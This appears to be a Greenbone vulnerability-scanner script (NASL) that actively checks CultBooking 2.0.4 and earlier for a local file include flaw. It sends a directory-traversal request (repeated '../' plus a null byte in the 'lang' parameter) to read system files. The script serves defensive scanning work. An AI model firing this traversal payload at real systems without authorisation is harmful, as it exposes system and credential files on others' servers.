# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cultuzz:cultbooking";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103042");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-01-25 13:20:03 +0100 (Tue, 25 Jan 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("CultBooking <= 2.0.4 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_cultbooking_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("cultbooking/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"CultBooking is prone to a local file include (LFI)
  vulnerability and multiple cross-site scripting (XSS) vulnerabilities because it fails to
  properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker can exploit the local file-include vulnerability
  using directory traversal strings to view and execute local files within the context of the
  webserver process. Information harvested may aid in further attacks.

  The attacker may leverage the cross-site scripting issues to execute arbitrary script code in the
  browser of an unsuspecting user in the context of the affected site. This may let the attacker
  steal cookie-based authentication credentials and launch other attacks.");

  script_tag(name:"affected", value:"CultBooking version 2.0.4 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45965");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4987.php");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-4988.php");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/cultbooking.php?lang=" + crap(data: "../", length: 3 * 9) + files[file] + "%00";

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
